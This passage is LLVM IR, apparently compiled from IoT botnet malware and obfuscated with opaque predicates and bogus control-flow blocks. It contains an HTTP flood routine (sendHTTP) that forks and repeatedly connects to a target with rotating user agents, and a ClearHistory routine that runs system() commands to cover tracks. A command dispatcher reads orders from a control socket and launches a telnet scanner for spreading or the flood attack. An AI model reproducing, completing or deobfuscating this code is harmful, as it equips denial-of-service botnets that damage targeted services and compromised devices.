originalBBpart24:                                 ; preds = %originalBB1
  ret i32 %70

originalBBalteredBB:                              ; preds = %originalBB, %2
  %79 = alloca i32, align 4
  %80 = alloca i8*, align 8
  %81 = alloca i16, align 2
  %82 = alloca %struct.hostent*, align 8
  %83 = alloca %struct.sockaddr_in, align 4
  %84 = alloca i32, align 4
  %85 = alloca i32, align 4
  store i8* %0, i8** %80, align 8
  store i16 %1, i16* %81, align 2
  store i32 1, i32* %84, align 4
  %86 = load i8*, i8** %80, align 8
  %87 = call %struct.hostent* @gethostbyname(i8* %86)
  store %struct.hostent* %87, %struct.hostent** %82, align 8
  %88 = icmp eq %struct.hostent* %87, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %61
  %89 = load i32, i32* %11, align 4
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %19 = call i64 @time(i64* null) #5
  %20 = load i32, i32* %11, align 4
  %21 = sext i32 %20 to i64
  %22 = add nsw i64 %19, %21
  %23 = trunc i64 %22 to i32
  store i32 %23, i32* %15, align 4
  store i32 0, i32* %16, align 4
  store i32 0, i32* %14, align 4
  br label %24

; <label>:24:                                     ; preds = %originalBBpart221, %6
  %25 = load i32, i32* %14, align 4
  %26 = load i32, i32* %12, align 4
  %27 = icmp slt i32 %25, %26
  br i1 %27, label %28, label %118

; <label>:28:                                     ; preds = %24
  %29 = load i32, i32* @x.83
  %30 = load i32, i32* @y.84
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %28
  %37 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %38 = load i8*, i8** %7, align 8
  %39 = load i8*, i8** %10, align 8
  %40 = load i8*, i8** %8, align 8
  %41 = call i32 @rand() #5
  %42 = srem i32 %41, 36
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds [36 x i8*], [36 x i8*]* @UserAgents, i64 0, i64 %43
  %45 = load i8*, i8** %44, align 8
  %46 = call i32 (i8*, i8*, ...) @sprintf(i8* %37, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.303, i32 0, i32 0), i8* %38, i8* %39, i8* %40, i8* %45) #5
  %47 = call i32 @fork() #5
  %48 = icmp ne i32 %47, 0
  %49 = load i32, i32* @x.83
  %50 = load i32, i32* @y.84
  %51 = sub i32 %49, 1
  %52 = mul i32 %49, %51
  %53 = urem i32 %52, 2
  %54 = icmp eq i32 %53, 0
  %55 = icmp slt i32 %50, 10
  %56 = or i1 %54, %55
  br i1 %56, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %48, label %57, label %98

; <label>:57:                                     ; preds = %originalBBpart2
  br label %58

; <label>:58:                                     ; preds = %originalBBpart216, %57
  %59 = load i32, i32* %15, align 4
  %60 = sext i32 %59 to i64
  %61 = call i64 @time(i64* null) #5
  %62 = icmp sgt i64 %60, %61
  br i1 %62, label %63, label %97

; <label>:63:                                     ; preds = %58
  %64 = load i8*, i8** %8, align 8
  %65 = load i16, i16* %9, align 2
  %66 = call i32 @socket_connect(i8* %64, i16 zeroext %65)
  store i32 %66, i32* %13, align 4
  %67 = load i32, i32* %13, align 4
  %68 = icmp ne i32 %67, 0
  br i1 %68, label %69, label %80

; <label>:69:                                     ; preds = %63
  %70 = load i32, i32* %13, align 4
  %71 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %72 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %73 = call i64 @strlen(i8* %72) #9
  %74 = call i64 @write(i32 %70, i8* %71, i64 %73)
  %75 = load i32, i32* %13, align 4
  %76 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %77 = call i64 @read(i32 %75, i8* %76, i64 1)
  %78 = load i32, i32* %13, align 4
  %79 = call i32 @close(i32 %78)
  br label %80

; <label>:80:                                     ; preds = %69, %63
  %81 = load i32, i32* @x.83
  %82 = load i32, i32* @y.84
  %83 = sub i32 %81, 1
  %84 = mul i32 %81, %83
  %85 = urem i32 %84, 2
  %86 = icmp eq i32 %85, 0
  %87 = icmp slt i32 %82, 10
  %88 = or i1 %86, %87
  br i1 %88, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %80
  %89 = load i32, i32* @x.83
  %90 = load i32, i32* @y.84
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %58

; <label>:97:                                     ; preds = %58
  call void @exit(i32 0) #12
  unreachable

; <label>:98:                                     ; preds = %originalBBpart2
  br label %99

; <label>:99:                                     ; preds = %98
  %100 = load i32, i32* @x.83
  %101 = load i32, i32* @y.84
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %99
  %108 = load i32, i32* %14, align 4
  %109 = add nsw i32 %108, 1
  store i32 %109, i32* %14, align 4
  %110 = load i32, i32* @x.83
  %111 = load i32, i32* @y.84
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBBpart221, label %originalBB18alteredBB

originalBBpart221:                                ; preds = %originalBB18
  br label %24

; <label>:118:                                    ; preds = %24
  %119 = load i32, i32* @x.83
  %120 = load i32, i32* @y.84
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBB23, label %originalBB23alteredBB

originalBB23:                                     ; preds = %originalBB23alteredBB, %118
  %127 = load i32, i32* @x.83
  %128 = load i32, i32* @y.84
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBBpart225, label %originalBB23alteredBB

originalBBpart225:                                ; preds = %originalBB23
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %28
  %135 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %136 = load i8*, i8** %7, align 8
  %137 = load i8*, i8** %10, align 8
  %138 = load i8*, i8** %8, align 8
  %139 = call i32 @rand() #5
  %_ = sub i32 %139, 36
  %gen = mul i32 %_, 36
  %_1 = sub i32 0, %139
  %gen2 = add i32 %_1, 36
  %_3 = sub i32 %139, 36
  %gen4 = mul i32 %_3, 36
  %_5 = sub i32 %139, 36
  %gen6 = mul i32 %_5, 36
  %_7 = shl i32 %139, 36
  %_8 = sub i32 %139, 36
  %gen9 = mul i32 %_8, 36
  %_10 = sub i32 %139, 36
  %gen11 = mul i32 %_10, 36
  %_12 = sub i32 0, %139
  %gen13 = add i32 %_12, 36
  %140 = srem i32 %139, 36
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds [36 x i8*], [36 x i8*]* @UserAgents, i64 0, i64 %141
  %143 = load i8*, i8** %142, align 8
  %144 = call i32 (i8*, i8*, ...) @sprintf(i8* %135, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.303, i32 0, i32 0), i8* %136, i8* %137, i8* %138, i8* %143) #5
  %145 = call i32 @fork() #5
  %146 = icmp ne i32 %145, 0
  br label %originalBB

originalBB14alteredBB:                            ; preds = %originalBB14, %80
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %99
  %147 = load i32, i32* %14, align 4
  %_19 = shl i32 %147, 1
  %148 = add nsw i32 %147, 1
  store i32 %148, i32* %14, align 4
  br label %originalBB18

originalBB23alteredBB:                            ; preds = %originalBB23, %118
  br label %originalBB23
}

declare i64 @read(i32, i8*, i64) #2

; Function Attrs: noreturn nounwind
declare void @exit(i32) #8

; Function Attrs: noinline nounwind uwtable
define void @ClearHistory() #0 {
  %1 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.295, i32 0, i32 0))
  %2 = call i32 @system(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.304, i32 0, i32 0))
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i8*, align 8
  %30 = alloca i32, align 4
  %31 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %32 = load i8**, i8*** %4, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 0
  %34 = load i8*, i8** %33, align 8
  %35 = call i32 @strcmp(i8* %34, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.305, i32 0, i32 0)) #9
  %36 = icmp ne i32 %35, 0
  br i1 %36, label %38, label %37

; <label>:37:                                     ; preds = %2
  br label %1121

; <label>:38:                                     ; preds = %2
  %39 = load i32, i32* @x.87
  %40 = load i32, i32* @y.88
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %38
  %47 = load i8**, i8*** %4, align 8
  %48 = getelementptr inbounds i8*, i8** %47, i64 0
  %49 = load i8*, i8** %48, align 8
  %50 = call i32 @strcmp(i8* %49, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.306, i32 0, i32 0)) #9
  %51 = icmp ne i32 %50, 0
  %52 = load i32, i32* @x.87
  %53 = load i32, i32* @y.88
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %51, label %282, label %60

; <label>:60:                                     ; preds = %originalBBpart2
  %61 = load i8**, i8*** %4, align 8
  %62 = getelementptr inbounds i8*, i8** %61, i64 1
  %63 = load i8*, i8** %62, align 8
  %64 = call i32 @strcmp(i8* %63, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.307, i32 0, i32 0)) #9
  %65 = icmp ne i32 %64, 0
  br i1 %65, label %159, label %66

; <label>:66:                                     ; preds = %60
  %67 = call i32 @fork() #5
  store i32 %67, i32* %5, align 4
  store i32 0, i32* %6, align 4
  %68 = call i64 @sysconf(i32 84) #5
  %69 = trunc i64 %68 to i32
  store i32 %69, i32* %7, align 4
  store i32 999999, i32* %8, align 4
  %70 = load i32, i32* %7, align 4
  %71 = icmp eq i32 %70, 1
  br i1 %71, label %72, label %73

; <label>:72:                                     ; preds = %66
  store i32 500, i32* %8, align 4
  br label %73

; <label>:73:                                     ; preds = %72, %66
  %74 = load i32, i32* %7, align 4
  %75 = icmp sge i32 %74, 2
  br i1 %75, label %76, label %93

; <label>:76:                                     ; preds = %73
  %77 = load i32, i32* @x.87
  %78 = load i32, i32* @y.88
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %76
  store i32 1000, i32* %8, align 4
  %85 = load i32, i32* @x.87
  %86 = load i32, i32* @y.88
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %93

; <label>:93:                                     ; preds = %originalBBpart24, %73
  %94 = load i32, i32* %5, align 4
  %95 = icmp ugt i32 %94, 0
  br i1 %95, label %96, label %98

; <label>:96:                                     ; preds = %93
  %97 = load i32, i32* %5, align 4
  store i32 %97, i32* @scanPid, align 4
  br label %1121

; <label>:98:                                     ; preds = %93
  %99 = load i32, i32* %5, align 4
  %100 = icmp eq i32 %99, -1
  br i1 %100, label %101, label %118

; <label>:101:                                    ; preds = %98
  %102 = load i32, i32* @x.87
  %103 = load i32, i32* @y.88
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %101
  %110 = load i32, i32* @x.87
  %111 = load i32, i32* @y.88
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %1121

; <label>:118:                                    ; preds = %98
  %119 = load i32, i32* @x.87
  %120 = load i32, i32* @y.88
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %118
  %127 = load i32, i32* @x.87
  %128 = load i32, i32* @y.88
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %135

; <label>:135:                                    ; preds = %originalBBpart212
  store i32 0, i32* %6, align 4
  br label %136

; <label>:136:                                    ; preds = %155, %135
  %137 = load i32, i32* %6, align 4
  %138 = load i32, i32* %7, align 4
  %139 = icmp slt i32 %137, %138
  br i1 %139, label %140, label %158

; <label>:140:                                    ; preds = %136
  %141 = call i64 @time(i64* null) #5
  %142 = call i32 @getpid() #5
  %143 = sext i32 %142 to i64
  %144 = xor i64 %141, %143
  %145 = call i32 @getppid() #5
  %146 = sext i32 %145 to i64
  %147 = add nsw i64 %144, %146
  %148 = trunc i64 %147 to i32
  call void @srand(i32 %148) #5
  %149 = call i64 @time(i64* null) #5
  %150 = call i32 @getpid() #5
  %151 = sext i32 %150 to i64
  %152 = xor i64 %149, %151
  %153 = trunc i64 %152 to i32
  call void @init_rand(i32 %153)
  %154 = load i32, i32* %8, align 4
  call void @TelnetScanner(i32 100, i32 %154)
  call void @_exit(i32 0) #11
  unreachable
                                                  ; No predecessors!
  %156 = load i32, i32* %6, align 4
  %157 = add nsw i32 %156, 1
  store i32 %157, i32* %6, align 4
  br label %136

; <label>:158:                                    ; preds = %136
  br label %159

; <label>:159:                                    ; preds = %158, %60
  %160 = load i32, i32* @x.87
  %161 = load i32, i32* @y.88
  %162 = sub i32 %160, 1
  %163 = mul i32 %160, %162
  %164 = urem i32 %163, 2
  %165 = icmp eq i32 %164, 0
  %166 = icmp slt i32 %161, 10
  %167 = or i1 %165, %166
  br i1 %167, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %159
  %168 = load i8**, i8*** %4, align 8
  %169 = getelementptr inbounds i8*, i8** %168, i64 1
  %170 = load i8*, i8** %169, align 8
  %171 = call i32 @strcmp(i8* %170, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.308, i32 0, i32 0)) #9
  %172 = icmp ne i32 %171, 0
  %173 = load i32, i32* @x.87
  %174 = load i32, i32* @y.88
  %175 = sub i32 %173, 1
  %176 = mul i32 %173, %175
  %177 = urem i32 %176, 2
  %178 = icmp eq i32 %177, 0
  %179 = icmp slt i32 %174, 10
  %180 = or i1 %178, %179
  br i1 %180, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %172, label %220, label %181

; <label>:181:                                    ; preds = %originalBBpart216
  %182 = load i32, i32* @scanPid, align 4
  %183 = icmp eq i32 %182, 0
  br i1 %183, label %184, label %201

; <label>:184:                                    ; preds = %181
  %185 = load i32, i32* @x.87
  %186 = load i32, i32* @y.88
  %187 = sub i32 %185, 1
  %188 = mul i32 %185, %187
  %189 = urem i32 %188, 2
  %190 = icmp eq i32 %189, 0
  %191 = icmp slt i32 %186, 10
  %192 = or i1 %190, %191
  br i1 %192, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %184
  %193 = load i32, i32* @x.87
  %194 = load i32, i32* @y.88
  %195 = sub i32 %193, 1
  %196 = mul i32 %193, %195
  %197 = urem i32 %196, 2
  %198 = icmp eq i32 %197, 0
  %199 = icmp slt i32 %194, 10
  %200 = or i1 %198, %199
  br i1 %200, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %1121

; <label>:201:                                    ; preds = %181
  %202 = load i32, i32* @x.87
  %203 = load i32, i32* @y.88
  %204 = sub i32 %202, 1
  %205 = mul i32 %202, %204
  %206 = urem i32 %205, 2
  %207 = icmp eq i32 %206, 0
  %208 = icmp slt i32 %203, 10
  %209 = or i1 %207, %208
  br i1 %209, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %201
  %210 = load i32, i32* @scanPid, align 4
  %211 = call i32 @kill(i32 %210, i32 9) #5
  store i32 0, i32* @scanPid, align 4
  %212 = load i32, i32* @x.87
  %213 = load i32, i32* @y.88
  %214 = sub i32 %212, 1
  %215 = mul i32 %212, %214
  %216 = urem i32 %215, 2
  %217 = icmp eq i32 %216, 0
  %218 = icmp slt i32 %213, 10
  %219 = or i1 %217, %218
  br i1 %219, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %220

; <label>:220:                                    ; preds = %originalBBpart224, %originalBBpart216
  %221 = load i8**, i8*** %4, align 8
  %222 = getelementptr inbounds i8*, i8** %221, i64 1
  %223 = load i8*, i8** %222, align 8
  %224 = call i32 @strcmp(i8* %223, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.309, i32 0, i32 0)) #9
  %225 = icmp ne i32 %224, 0
  br i1 %225, label %265, label %226

; <label>:226:                                    ; preds = %220
  %227 = load i32, i32* %3, align 4
  %228 = icmp slt i32 %227, 3
  br i1 %228, label %229, label %232

; <label>:229:                                    ; preds = %226
  %230 = load i32, i32* @mainCommSock, align 4
  %231 = call i32 (i32, i8*, ...) @sockprintf(i32 %230, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.310, i32 0, i32 0))
  br label %1121

; <label>:232:                                    ; preds = %226
  %233 = load i8**, i8*** %4, align 8
  %234 = getelementptr inbounds i8*, i8** %233, i64 1
  %235 = load i8*, i8** %234, align 8
  %236 = call i32 @atoi(i8* %235) #9
  store i32 %236, i32* %9, align 4
  %237 = load i8**, i8*** %4, align 8
  %238 = getelementptr inbounds i8*, i8** %237, i64 2
  %239 = load i8*, i8** %238, align 8
  %240 = call i32 @atoi(i8* %239) #9
  store i32 %240, i32* %10, align 4
  %241 = call i32 @listFork()
  %242 = icmp ne i32 %241, 0
  br i1 %242, label %264, label %243

; <label>:243:                                    ; preds = %232
  %244 = load i32, i32* @x.87
  %245 = load i32, i32* @y.88
  %246 = sub i32 %244, 1
  %247 = mul i32 %244, %246
  %248 = urem i32 %247, 2
  %249 = icmp eq i32 %248, 0
  %250 = icmp slt i32 %245, 10
  %251 = or i1 %249, %250
  br i1 %251, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %243
  %252 = load i32, i32* @mainCommSock, align 4
  %253 = call i32 (i32, i8*, ...) @sockprintf(i32 %252, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.311, i32 0, i32 0))
  %254 = load i32, i32* %10, align 4
  %255 = load i32, i32* %9, align 4
  call void @TelnetScanner(i32 %254, i32 %255)
  call void @_exit(i32 0) #11
  %256 = load i32, i32* @x.87
  %257 = load i32, i32* @y.88
  %258 = sub i32 %256, 1
  %259 = mul i32 %256, %258
  %260 = urem i32 %259, 2
  %261 = icmp eq i32 %260, 0
  %262 = icmp slt i32 %257, 10
  %263 = or i1 %261, %262
  br i1 %263, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  unreachable

; <label>:264:                                    ; preds = %232
  br label %1121

; <label>:265:                                    ; preds = %220
  %266 = load i32, i32* @x.87
  %267 = load i32, i32* @y.88
  %268 = sub i32 %266, 1
  %269 = mul i32 %266, %268
  %270 = urem i32 %269, 2
  %271 = icmp eq i32 %270, 0
  %272 = icmp slt i32 %267, 10
  %273 = or i1 %271, %272
  br i1 %273, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %265
  %274 = load i32, i32* @x.87
  %275 = load i32, i32* @y.88
  %276 = sub i32 %274, 1
  %277 = mul i32 %274, %276
  %278 = urem i32 %277, 2
  %279 = icmp eq i32 %278, 0
  %280 = icmp slt i32 %275, 10
  %281 = or i1 %279, %280
  br i1 %281, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %282

; <label>:282:                                    ; preds = %originalBBpart232, %originalBBpart2
  %283 = load i8**, i8*** %4, align 8
  %284 = getelementptr inbounds i8*, i8** %283, i64 0
  %285 = load i8*, i8** %284, align 8
  %286 = call i32 @strcmp(i8* %285, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.312, i32 0, i32 0)) #9
  %287 = icmp ne i32 %286, 0
  br i1 %287, label %363, label %288

; <label>:288:                                    ; preds = %282
  %289 = load i32, i32* %3, align 4
  %290 = icmp slt i32 %289, 6
  br i1 %290, label %303, label %291

; <label>:291:                                    ; preds = %288
  %292 = load i8**, i8*** %4, align 8
  %293 = getelementptr inbounds i8*, i8** %292, i64 3
  %294 = load i8*, i8** %293, align 8
  %295 = call i32 @atoi(i8* %294) #9
  %296 = icmp slt i32 %295, 1
  br i1 %296, label %303, label %297

; <label>:297:                                    ; preds = %291
  %298 = load i8**, i8*** %4, align 8
  %299 = getelementptr inbounds i8*, i8** %298, i64 5
  %300 = load i8*, i8** %299, align 8
  %301 = call i32 @atoi(i8* %300) #9
  %302 = icmp slt i32 %301, 1
  br i1 %302, label %303, label %320

; <label>:303:                                    ; preds = %297, %291, %288
  %304 = load i32, i32* @x.87
  %305 = load i32, i32* @y.88
  %306 = sub i32 %304, 1
  %307 = mul i32 %304, %306
  %308 = urem i32 %307, 2
  %309 = icmp eq i32 %308, 0
  %310 = icmp slt i32 %305, 10
  %311 = or i1 %309, %310
  br i1 %311, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %303
  %312 = load i32, i32* @x.87
  %313 = load i32, i32* @y.88
  %314 = sub i32 %312, 1
  %315 = mul i32 %312, %314
  %316 = urem i32 %315, 2
  %317 = icmp eq i32 %316, 0
  %318 = icmp slt i32 %313, 10
  %319 = or i1 %317, %318
  br i1 %319, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %1121

; <label>:320:                                    ; preds = %297
  %321 = call i32 @listFork()
  %322 = icmp ne i32 %321, 0
  br i1 %322, label %323, label %340

; <label>:323:                                    ; preds = %320
  %324 = load i32, i32* @x.87
  %325 = load i32, i32* @y.88
  %326 = sub i32 %324, 1
  %327 = mul i32 %324, %326
  %328 = urem i32 %327, 2
  %329 = icmp eq i32 %328, 0
  %330 = icmp slt i32 %325, 10
  %331 = or i1 %329, %330
  br i1 %331, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %323
  %332 = load i32, i32* @x.87
  %333 = load i32, i32* @y.88
  %334 = sub i32 %332, 1
  %335 = mul i32 %332, %334
  %336 = urem i32 %335, 2
  %337 = icmp eq i32 %336, 0
  %338 = icmp slt i32 %333, 10
  %339 = or i1 %337, %338
  br i1 %339, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br label %1121

; <label>:340:                                    ; preds = %320
  %341 = load i8**, i8*** %4, align 8
  %342 = getelementptr inbounds i8*, i8** %341, i64 1
  %343 = load i8*, i8** %342, align 8
  %344 = load i8**, i8*** %4, align 8
  %345 = getelementptr inbounds i8*, i8** %344, i64 2
  %346 = load i8*, i8** %345, align 8
  %347 = load i8**, i8*** %4, align 8
  %348 = getelementptr inbounds i8*, i8** %347, i64 3
  %349 = load i8*, i8** %348, align 8
  %350 = call i32 @atoi(i8* %349) #9
  %351 = trunc i32 %350 to i16
  %352 = load i8**, i8*** %4, align 8
  %353 = getelementptr inbounds i8*, i8** %352, i64 4
  %354 = load i8*, i8** %353, align 8
  %355 = load i8**, i8*** %4, align 8
  %356 = getelementptr inbounds i8*, i8** %355, i64 5
  %357 = load i8*, i8** %356, align 8
  %358 = call i32 @atoi(i8* %357) #9
  %359 = load i8**, i8*** %4, align 8
  %360 = getelementptr inbounds i8*, i8** %359, i64 6
  %361 = load i8*, i8** %360, align 8
  %362 = call i32 @atoi(i8* %361) #9
  call void @sendHTTP(i8* %343, i8* %346, i16 zeroext %351, i8* %354, i32 %358, i32 %362)
  call void @exit(i32 0) #12
  unreachable

; <label>:363:                                    ; preds = %282
  %364 = load i8**, i8*** %4, align 8
  %365 = getelementptr inbounds i8*, i8** %364, i64 0
  %366 = load i8*, i8** %365, align 8
  %367 = call i32 @strcmp(i8* %366, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.313, i32 0, i32 0)) #9
  %368 = icmp ne i32 %367, 0
  br i1 %368, label %594, label %369

; <label>:369:                                    ; preds = %363
  %370 = load i32, i32* @x.87
  %371 = load i32, i32* @y.88
  %372 = sub i32 %370, 1
  %373 = mul i32 %370, %372
  %374 = urem i32 %373, 2
  %375 = icmp eq i32 %374, 0
  %376 = icmp slt i32 %371, 10
  %377 = or i1 %375, %376
  br i1 %377, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %369
  %378 = load i32, i32* %3, align 4
  %379 = icmp slt i32 %378, 6
  %380 = load i32, i32* @x.87
  %381 = load i32, i32* @y.88
  %382 = sub i32 %380, 1
  %383 = mul i32 %380, %382
  %384 = urem i32 %383, 2
  %385 = icmp eq i32 %384, 0
  %386 = icmp slt i32 %381, 10
  %387 = or i1 %385, %386
  br i1 %387, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br i1 %379, label %437, label %388

; <label>:388:                                    ; preds = %originalBBpart244
  %389 = load i8**, i8*** %4, align 8
  %390 = getelementptr inbounds i8*, i8** %389, i64 3
  %391 = load i8*, i8** %390, align 8
  %392 = call i32 @atoi(i8* %391) #9
  %393 = icmp eq i32 %392, -1
  br i1 %393, label %437, label %394

; <label>:394:                                    ; preds = %388
  %395 = load i8**, i8*** %4, align 8
  %396 = getelementptr inbounds i8*, i8** %395, i64 2
  %397 = load i8*, i8** %396, align 8
  %398 = call i32 @atoi(i8* %397) #9
  %399 = icmp eq i32 %398, -1
  br i1 %399, label %437, label %400

; <label>:400:                                    ; preds = %394
  %401 = load i32, i32* @x.87
  %402 = load i32, i32* @y.88
  %403 = sub i32 %401, 1
  %404 = mul i32 %401, %403
  %405 = urem i32 %404, 2
  %406 = icmp eq i32 %405, 0
